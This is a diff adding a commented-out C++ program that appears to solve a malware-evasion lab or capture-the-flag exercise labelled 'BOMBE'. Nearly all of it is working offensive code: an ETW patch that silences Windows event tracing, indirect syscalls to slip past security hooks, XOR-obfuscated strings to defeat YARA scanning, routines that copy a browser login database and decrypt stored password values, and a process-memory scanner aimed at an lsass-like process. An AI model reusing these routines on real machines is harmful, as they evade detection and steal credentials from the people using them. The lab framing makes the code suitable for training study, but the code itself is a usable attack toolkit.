@@ -1,0 +1,557 @@
+/*#include <windows.h>
+#include <winhttp.h>
+#include <wincrypt.h>
+#include <tlhelp32.h>
+#include <iostream>
+#include <string>
+#include <vector>
+#include <regex>
+#include <sstream>
+#include "sqlite3.h"
+
+// 保持 Lib 連結以防止 Crash
+#pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "sqlite3.lib")
+#pragma comment(lib, "user32.lib")
+#pragma comment(lib, "kernel32.lib")
+
+
+// [FIX] 修復 KPRIORITY 未定義
+typedef LONG KPRIORITY;
+// =============================================================
+// [結構定義區]
+// =============================================================
+
+// 定義必要的 NT 結構與 Enum
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, * PUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG Length;
+    HANDLE RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor;
+    PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;
+
+typedef struct _IO_STATUS_BLOCK {
+    union {
+        NTSTATUS Status;
+        PVOID Pointer;
+    } DUMMYUNIONNAME;
+    ULONG_PTR Information;
+} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;
+
+typedef struct _CLIENT_ID {
+    HANDLE UniqueProcess;
+    HANDLE UniqueThread;
+} CLIENT_ID, * PCLIENT_ID;
+
+// --- Registry Structures ---
+typedef enum _KEY_VALUE_INFORMATION_CLASS {
+    KeyValueBasicInformation,
+    KeyValueFullInformation,
+    KeyValuePartialInformation,
+    KeyValueFullInformationAlign64,
+    KeyValuePartialInformationAlign64,
+    MaxKeyValueInfoClass
+} KEY_VALUE_INFORMATION_CLASS;
+
+typedef struct _KEY_VALUE_PARTIAL_INFORMATION {
+    ULONG TitleIndex;
+    ULONG Type;
+    ULONG DataLength;
+    UCHAR Data[1];
+} KEY_VALUE_PARTIAL_INFORMATION, * PKEY_VALUE_PARTIAL_INFORMATION;
+
+// --- Process Enumeration Structures (For NtQuerySystemInformation) ---
+typedef enum _SYSTEM_INFORMATION_CLASS {
+    SystemProcessInformation = 5
+} SYSTEM_INFORMATION_CLASS;
+
+typedef struct _SYSTEM_PROCESS_INFORMATION {
+    ULONG NextEntryOffset;
+    ULONG NumberOfThreads;
+    BYTE Reserved1[48];
+    UNICODE_STRING ImageName;
+    KPRIORITY BasePriority;
+    HANDLE UniqueProcessId;
+    PVOID Reserved2;
+    ULONG HandleCount;
+    ULONG SessionId;
+    PVOID Reserved3;
+    SIZE_T PeakVirtualSize;
+    SIZE_T VirtualSize;
+    ULONG Reserved4;
+    SIZE_T PeakWorkingSetSize;
+    SIZE_T WorkingSetSize;
+    PVOID Reserved5;
+    SIZE_T QuotaPagedPoolUsage;
+    PVOID Reserved6;
+    SIZE_T QuotaNonPagedPoolUsage;
+    SIZE_T PagefileUsage;
+    SIZE_T PeakPagefileUsage;
+    SIZE_T PrivatePageCount;
+    LARGE_INTEGER Reserved7[6];
+} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;
+
+// --- Memory Query Structures (For NtQueryVirtualMemory) ---
+typedef enum _MEMORY_INFORMATION_CLASS {
+    MemoryBasicInformation
+} MEMORY_INFORMATION_CLASS;
+
+#ifndef InitializeObjectAttributes
+#define InitializeObjectAttributes( p, n, a, r, s ) { \
+    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
+    (p)->RootDirectory = r;                             \
+    (p)->Attributes = a;                                \
+    (p)->ObjectName = n;                                \
+    (p)->SecurityDescriptor = s;                        \
+    (p)->SecurityQualityOfService = NULL;               \
+    }
+#endif
+
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#endif
+
+
+// NT Constants
+#define FILE_SUPERSEDE                  0x00000000
+#define FILE_OPEN                       0x00000001
+#define FILE_CREATE                     0x00000002
+#define FILE_OPEN_IF                    0x00000003
+#define FILE_OVERWRITE                  0x00000004
+#define FILE_OVERWRITE_IF               0x00000005
+#define FILE_MAXIMUM_DISPOSITION        0x00000005
+
+#define FILE_READ_DATA        0x0001
+#define FILE_WRITE_DATA       0x0002
+#define FILE_SHARE_READ       0x0001
+#define FILE_SHARE_WRITE      0x0002
+#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
+#define FILE_ATTRIBUTE_NORMAL 0x00000080
+#define OBJ_CASE_INSENSITIVE  0x00000040L
+
+#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
+
+// ==========================================
+// [Syscalls 宣告]
+// ==========================================
+// Syscall Prototypes
+extern "C" {
+    NTSTATUS Sw3NtCreateFile(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
+    NTSTATUS Sw3NtReadFile(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
+    NTSTATUS Sw3NtWriteFile(HANDLE, HANDLE, PVOID, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
+    NTSTATUS Sw3NtClose(HANDLE);
+
+    NTSTATUS Sw3NtOpenProcess(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
+    NTSTATUS Sw3NtReadVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+    NTSTATUS Sw3NtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+    NTSTATUS Sw3NtProtectVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
+    NTSTATUS Sw3NtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+
+    // New for Challenge 1 & 3
+    NTSTATUS Sw3NtOpenKey(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
+    NTSTATUS Sw3NtQueryValueKey(HANDLE, PUNICODE_STRING, KEY_VALUE_INFORMATION_CLASS, PVOID, ULONG, PULONG);
+    NTSTATUS Sw3NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
+    NTSTATUS Sw3NtQueryVirtualMemory(HANDLE, PVOID, MEMORY_INFORMATION_CLASS, PVOID, SIZE_T, PSIZE_T);
+
+    // SysWhispers Resolvers (Assume these exist in your generated files)
+    void* SW3_GetRandomSyscallAddress();
+    DWORD SW3_GetSyscallNumber(DWORD Hash);
+}
+
+// ==========================================
+// [Anti-YARA] XorString
+// ==========================================
+template <int X> struct XorString {
+    std::string s;
+    bool is_encrypted;
+    XorString(const std::string& input) : s(input), is_encrypted(true) {
+        for (size_t i = 0; i < s.size(); i++) s[i] ^= X;
+    }
+    const char* decrypt() {
+        if (is_encrypted) {
+            for (size_t i = 0; i < s.size(); i++) s[i] ^= X;
+            is_encrypted = false;
+        }
+        return s.c_str();
+    }
+};
+
+// Secret: 0xBGaqjzZL7khGY5AcFs3oi0lIMmkvMF
+const char ENCRYPTED_SECRET[] = {
+    0x30 ^ 0x55, 0x78 ^ 0x55, 0x42 ^ 0x55, 0x47 ^ 0x55, 0x61 ^ 0x55, 0x71 ^ 0x55, 0x6A ^ 0x55, 0x7A ^ 0x55,
+    0x5A ^ 0x55, 0x4C ^ 0x55, 0x37 ^ 0x55, 0x6B ^ 0x55, 0x68 ^ 0x55, 0x47 ^ 0x55, 0x59 ^ 0x55, 0x35 ^ 0x55,
+    0x41 ^ 0x55, 0x63 ^ 0x55, 0x46 ^ 0x55, 0x73 ^ 0x55, 0x33 ^ 0x55, 0x6F ^ 0x55, 0x69 ^ 0x55, 0x30 ^ 0x55,
+    0x6C ^ 0x55, 0x49 ^ 0x55, 0x4D ^ 0x55, 0x6D ^ 0x55, 0x6B ^ 0x55, 0x76 ^ 0x55, 0x4D ^ 0x55, 0x46 ^ 0x55, 0x00
+};
+
+std::string GetSecret() {
+    std::string s(ENCRYPTED_SECRET);
+    for (size_t i = 0; i < s.size(); i++) s[i] ^= 0x55;
+    return s;
+}
+
+// Helper: ANSI to UNICODE
+void AnsiToUnicode(const char* ansi, UNICODE_STRING* us) {
+    int len = MultiByteToWideChar(CP_ACP, 0, ansi, -1, NULL, 0);
+    wchar_t* wstr = new wchar_t[len];
+    MultiByteToWideChar(CP_ACP, 0, ansi, -1, wstr, len);
+    us->Length = (USHORT)((len - 1) * sizeof(wchar_t));
+    us->MaximumLength = (USHORT)(len * sizeof(wchar_t));
+    us->Buffer = wstr;
+}
+
+std::vector<BYTE> HexStringToByteArray(const std::string& hex) {
+    std::vector<BYTE> bytes;
+    for (size_t i = 0; i < hex.length(); i += 2) {
+        std::string byteString = hex.substr(i, 2);
+        bytes.push_back((BYTE)strtoul(byteString.c_str(), NULL, 16));
+    }
+    return bytes;
+}
+
+std::string EscapeJsonString(const std::string& str) {
+    std::ostringstream escaped;
+    for (char c : str) {
+        if (c == '"') escaped << "\\\"";
+        else if (c == '\\') escaped << "\\\\";
+        else escaped << c;
+    }
+    return escaped.str();
+}
+
+// ==========================================
+// [Stealth ETW Patch]
+// ==========================================
+void PatchETW() {
+    char s_ntdll[] = { 'n','t','d','l','l','.','d','l','l', 0 };
+    HMODULE hNtdll = GetModuleHandleA(s_ntdll);
+    if (!hNtdll) return;
+
+    char s_etw[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0 };
+    void* pTarget = GetProcAddress(hNtdll, s_etw);
+    if (!pTarget) return;
+
+    // Pattern: MOV EAX, 0; RET (Avoid XOR RAX, RAX)
+    unsigned char patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 };
+
+    PVOID baseAddr = pTarget;
+    SIZE_T regionSize = sizeof(patch);
+    ULONG oldProtect = 0;
+
+    // Indirect Syscalls
+    if (NT_SUCCESS(Sw3NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, PAGE_READWRITE, &oldProtect))) {
+        SIZE_T bytesWritten = 0;
+        Sw3NtWriteVirtualMemory(GetCurrentProcess(), pTarget, patch, sizeof(patch), &bytesWritten);
+        ULONG tempProtect = 0;
+        Sw3NtProtectVirtualMemory(GetCurrentProcess(), &baseAddr, &regionSize, PAGE_EXECUTE_READ, &tempProtect);
+        std::cout << "[+] ETW Patched (Indirect Syscall)" << std::endl;
+    }
+}
+
+// ==========================================
+// File I/O via Indirect Syscalls
+// ==========================================
+std::vector<BYTE> ReadFileSyscall(const char* filePath) {
+    std::vector<BYTE> buffer;
+    std::string ntPath = "\\??\\";
+    ntPath += filePath;
+
+    UNICODE_STRING usPath;
+    AnsiToUnicode(ntPath.c_str(), &usPath);
+    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES), NULL, &usPath, OBJ_CASE_INSENSITIVE, NULL, NULL };
+    HANDLE hFile = NULL;
+    IO_STATUS_BLOCK ioStatus = { 0 };
+
+    if (NT_SUCCESS(Sw3NtCreateFile(&hFile, FILE_READ_DATA | SYNCHRONIZE, &oa, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, 7, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0))) {
+        const size_t MAX_READ = 20 * 1024 * 1024;
+        buffer.resize(MAX_READ);
+        LARGE_INTEGER offset = { 0 };
+        NTSTATUS status = Sw3NtReadFile(hFile, NULL, NULL, NULL, &ioStatus, buffer.data(), MAX_READ, &offset, NULL);
+        if (NT_SUCCESS(status)) buffer.resize(ioStatus.Information);
+        else buffer.clear();
+        Sw3NtClose(hFile);
+    }
+    delete[] usPath.Buffer;
+    return buffer;
+}
+
+bool WriteFileSyscall(const char* filePath, const std::vector<BYTE>& data) {
+    std::string ntPath = "\\??\\";
+    ntPath += filePath;
+    UNICODE_STRING usPath;
+    AnsiToUnicode(ntPath.c_str(), &usPath);
+    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES), NULL, &usPath, OBJ_CASE_INSENSITIVE, NULL, NULL };
+    HANDLE hFile = NULL;
+    IO_STATUS_BLOCK ioStatus = { 0 };
+    bool success = false;
+
+    if (NT_SUCCESS(Sw3NtCreateFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0))) {
+        LARGE_INTEGER offset = { 0 };
+        if (NT_SUCCESS(Sw3NtWriteFile(hFile, NULL, NULL, NULL, &ioStatus, (PVOID)data.data(), (ULONG)data.size(), &offset, NULL))) {
+            success = true;
+        }
+        Sw3NtClose(hFile);
+    }
+    delete[] usPath.Buffer;
+    return success;
+}
+
+std::string DecryptPassword(const std::vector<BYTE>& encryptedData, const std::vector<BYTE>& key, const std::vector<BYTE>& iv) {
+    HCRYPTPROV hProv = NULL;
+    HCRYPTKEY hKey = NULL;
+    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return "";
+    struct { BLOBHEADER hdr; DWORD dwKeySize; BYTE rgbKey[32]; } keyBlob;
+    keyBlob.hdr.bType = PLAINTEXTKEYBLOB; keyBlob.hdr.bVersion = CUR_BLOB_VERSION; keyBlob.hdr.reserved = 0; keyBlob.hdr.aiKeyAlg = CALG_AES_256;
+    keyBlob.dwKeySize = key.size(); memcpy(keyBlob.rgbKey, key.data(), key.size());
+    HCRYPTKEY hTempKey = NULL;
+    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hTempKey)) { CryptReleaseContext(hProv, 0); return ""; }
+    hKey = hTempKey;
+    DWORD mode = CRYPT_MODE_CBC;
+    CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv.data(), 0);
+    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
+    DWORD dataLen = encryptedData.size();
+    std::vector<BYTE> decryptedData = encryptedData;
+    std::string result = "";
+    if (CryptDecrypt(hKey, 0, TRUE, 0, decryptedData.data(), &dataLen)) {
+        result = std::string(reinterpret_cast<const char*>(decryptedData.data()), dataLen);
+    }
+    CryptDestroyKey(hKey);
+    CryptReleaseContext(hProv, 0);
+    return result;
+}
+
+// ==========================================
+// Challenge 1: Registry via Indirect Syscalls
+// ==========================================
+std::string Challenge1() {
+    // NT Path: \Registry\Machine\SOFTWARE\BOMBE
+    // Key: 0x55
+    unsigned char encNtPath[] = {
+        0x5c ^ 0x55, 0x52 ^ 0x55, 0x65 ^ 0x55, 0x67 ^ 0x55, 0x69 ^ 0x55, 0x73 ^ 0x55, 0x74 ^ 0x55, 0x72 ^ 0x55, 0x79 ^ 0x55, 0x5c ^ 0x55, // \Registry
+                0x4d^0x55, 0x61^0x55, 0x63^0x55, 0x68^0x55, 0x69^0x55, 0x6e^0x55, 0x65^0x55, 0x5c^0x55, // Machine
+                0x53^0x55, 0x4f^0x55, 0x46^0x55, 0x54^0x55, 0x57^0x55, 0x41^0x55, 0x52^0x55, 0x45^0x55, 0x5c^0x55, // SOFTWARE
+                0x42^0x55, 0x4f^0x55, 0x4d^0x55, 0x42^0x55, 0x45^0x55, 0x00 // BOMBE
+    };
+    std::string sNtPath;
+    for (int i = 0; encNtPath[i] != 0; i++) sNtPath += (char)(encNtPath[i] ^ 0x55);
+
+    UNICODE_STRING usKeyName;
+    AnsiToUnicode(sNtPath.c_str(), &usKeyName);
+    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES), NULL, &usKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL };
+
+    HANDLE hKey = NULL;
+    NTSTATUS status = Sw3NtOpenKey(&hKey, KEY_QUERY_VALUE, &oa);
+    delete[] usKeyName.Buffer;
+
+
+    XorString<0x55> s_val("answer_1");
+    UNICODE_STRING usValueName;
+    AnsiToUnicode(s_val.decrypt(), &usValueName);
+
+    char buffer[1024];
+    ULONG resultLength = 0;
+    status = Sw3NtQueryValueKey(hKey, &usValueName, KeyValuePartialInformation, buffer, sizeof(buffer), &resultLength);
+    delete[] usValueName.Buffer;
+    Sw3NtClose(hKey);
+
+    if (NT_SUCCESS(status)) {
+        PKEY_VALUE_PARTIAL_INFORMATION pInfo = (PKEY_VALUE_PARTIAL_INFORMATION)buffer;
+        if (pInfo->Type == 1 && pInfo->DataLength > 0) { // REG_SZ
+            // NT Registry returns WCHAR
+            std::wstring wResult((wchar_t*)pInfo->Data, pInfo->DataLength / sizeof(wchar_t));
+            if (!wResult.empty() && wResult.back() == L'\0') wResult.pop_back();
+            int size_needed = WideCharToMultiByte(CP_ACP, 0, wResult.c_str(), (int)wResult.length(), NULL, 0, NULL, NULL);
+            std::string strTo(size_needed, 0);
+            WideCharToMultiByte(CP_ACP, 0, wResult.c_str(), (int)wResult.length(), &strTo[0], size_needed, NULL, NULL);
+            return strTo;
+        }
+    }
+    
+    return "";
+}
+
+// ==========================================
+// Challenge 2: Chrome DB via Indirect Syscalls
+// ==========================================
+std::string Challenge2() {
+    unsigned char encPath[] = {
+        0x52, 0x2b, 0x4d, 0x64, 0x62, 0x74, 0x63, 0x62, 0x4d, 0x73,
+        0x7e, 0x7c, 0x73, 0x74, 0x4d, 0x50, 0x61, 0x61, 0x55, 0x70,
+        0x65, 0x4d, 0x5d, 0x7e, 0x72, 0x70, 0x7d, 0x4d, 0x73, 0x79,
+        0x63, 0x7e, 0x7c, 0x74, 0x4d, 0x5d, 0x7e, 0x76, 0x78, 0x7f,
+        0x31, 0x55, 0x70, 0x65, 0x70, 0x00
+    };
+    std::string dbPath;
+    for (int i = 0; encPath[i] != 0; i++) dbPath += (char)(encPath[i] ^ 0x11);
+
+    std::vector<BYTE> fileData = ReadFileSyscall(dbPath.c_str());
+    if (fileData.empty()) return "FAILED_READ_DB";
+
+    char tempPath[MAX_PATH];
+    GetTempPathA(MAX_PATH, tempPath);
+    char tempFile[MAX_PATH];
+    GetTempFileNameA(tempPath, "tmp", 0, tempFile);
+
+    if (!WriteFileSyscall(tempFile, fileData)) return "ERR_WRITE";
+
+    sqlite3* db;
+    std::string finalFlag = "FLAG_NOT_FOUND";
+    if (sqlite3_open(tempFile, &db) == SQLITE_OK) {
+        XorString<0x55> q("SELECT password_value FROM logins");
+        sqlite3_stmt* stmt;
+        if (sqlite3_prepare_v2(db, q.decrypt(), -1, &stmt, NULL) == SQLITE_OK) {
+            std::string secStr = GetSecret();
+            std::vector<BYTE> keyBytes(32);
+            memcpy(keyBytes.data(), secStr.c_str(), 32);
+
+            while (sqlite3_step(stmt) == SQLITE_ROW) {
+                const char* pwHex = (const char*)sqlite3_column_text(stmt, 0);
+                if (pwHex) {
+                    std::vector<BYTE> encBytes = HexStringToByteArray(pwHex);
+                    if (encBytes.size() >= 32) {
+                        std::vector<BYTE> iv(encBytes.begin(), encBytes.begin() + 16);
+                        std::vector<BYTE> data(encBytes.begin() + 16, encBytes.end());
+                        std::string dec = DecryptPassword(data, keyBytes, iv);
+                        if (dec.find("BOMBE_MAL_FLAG_") == 0) {
+                            finalFlag = dec;
+                            break;
+                        }
+                    }
+                }
+            }
+            sqlite3_finalize(stmt);
+        }
+        sqlite3_close(db);
+    }
+    DeleteFileA(tempFile);
+    return finalFlag;
+}
+
+// ==========================================
+// Challenge 3: Memory Scan via Indirect Syscalls
+// ==========================================
+std::string Challenge3() {
+    // 1. Process Enumeration via NtQuerySystemInformation (No CreateToolhelp32Snapshot)
+    ULONG bufferSize = 0;
+    Sw3NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &bufferSize);
+
+    // Allocate buffer
+    bufferSize += 1024; // Safety padding
+    PVOID buffer = NULL;
+    // Note: VirtualAlloc is typically hooked. But for local memory, it's safer.
+    // For ultimate stealth, use NtAllocateVirtualMemory (we have it in ASM)
+    SIZE_T size = bufferSize;
+    Sw3NtAllocateVirtualMemory(GetCurrentProcess(), &buffer, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    if (!buffer) return "";
+
+    NTSTATUS status = Sw3NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize);
+    if (!NT_SUCCESS(status)) return "";
+
+    DWORD pid = 0;
+    PSYSTEM_PROCESS_INFORMATION spi = (PSYSTEM_PROCESS_INFORMATION)buffer;
+    XorString<0x55> target("bsass.exe");
+
+    while (TRUE) {
+        if (spi->ImageName.Buffer) {
+            // NT ImageName is UNICODE
+            int len = WideCharToMultiByte(CP_ACP, 0, spi->ImageName.Buffer, spi->ImageName.Length / 2, NULL, 0, NULL, NULL);
+            std::string name(len, 0);
+            WideCharToMultiByte(CP_ACP, 0, spi->ImageName.Buffer, spi->ImageName.Length / 2, &name[0], len, NULL, NULL);
+
+            if (_stricmp(name.c_str(), target.decrypt()) == 0) {
+                pid = (DWORD)(uintptr_t)spi->UniqueProcessId;
+                break;
+            }
+        }
+        if (spi->NextEntryOffset == 0) break;
+        spi = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)spi + spi->NextEntryOffset);
+    }
+
+    if (pid == 0) return "";
+
+    // 2. Scan Memory
+    HANDLE hProcess = NULL;
+    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES), 0, 0, 0, 0, 0 };
+    CLIENT_ID cid;
+    cid.UniqueProcess = (HANDLE)(uintptr_t)pid;
+    cid.UniqueThread = 0;
+
+    if (!NT_SUCCESS(Sw3NtOpenProcess(&hProcess, PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, &oa, &cid))) return "";
+
+    MEMORY_BASIC_INFORMATION mbi;
+    PVOID addr = 0;
+    std::string result = "";
+    std::regex re("BOMBE_MAL_FLAG_[A-Za-z0-9]{32}");
+
+    while (TRUE) {
+        SIZE_T retLen = 0;
+        // Indirect Syscall: NtQueryVirtualMemory
+        status = Sw3NtQueryVirtualMemory(hProcess, addr, MemoryBasicInformation, &mbi, sizeof(mbi), &retLen);
+        if (!NT_SUCCESS(status)) break;
+
+        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
+            std::vector<BYTE> buf(mbi.RegionSize);
+            SIZE_T bytesRead = 0;
+            if (NT_SUCCESS(Sw3NtReadVirtualMemory(hProcess, mbi.BaseAddress, buf.data(), mbi.RegionSize, &bytesRead)) && bytesRead > 0) {
+                std::string content((char*)buf.data(), bytesRead);
+                std::smatch match;
+                if (std::regex_search(content, match, re)) {
+                    result = match.str();
+                    break;
+                }
+            }
+        }
+        addr = (PVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize);
+    }
+    Sw3NtClose(hProcess);
+    return result;
+}
+
+int main() {
+    std::cout << "[*] Program Started..." << std::endl;
+
+    try {
+        PatchETW();
+
+        std::cout << "[*] Running Challenge 1 (Indirect Syscall)..." << std::endl;
+        std::string a1 = Challenge1();
+
+        std::cout << "[*] Running Challenge 2 (Indirect Syscall)..." << std::endl;
+        std::string a2 = Challenge2();
+
+        std::cout << "[*] Running Challenge 3 (Indirect Syscall)..." << std::endl;
+        std::string a3 = Challenge3();
+
+        std::ostringstream json;
+        json << "{";
+        json << "\"answer_1\":\"" << EscapeJsonString(a1) << "\",";
+        json << "\"answer_2\":\"" << EscapeJsonString(a2) << "\",";
+        json << "\"answer_3\":\"" << EscapeJsonString(a3) << "\",";
+        json << "\"secret\":\"" << GetSecret() << "\"";
+        json << "}";
+
+        std::cout << "\n[+] Payload Generated:\n" << json.str() << std::endl;
+
+    }
+    catch (const std::exception& e) {
+        std::cout << "[!] Exception: " << e.what() << std::endl;
+    }
+    catch (...) {
+        std::cout << "[!] Unknown Exception" << std::endl;
+    }
+
+    std::cout << "\nPress Enter to exit...";
+    std::cin.get();
+    return 0;
+}*/
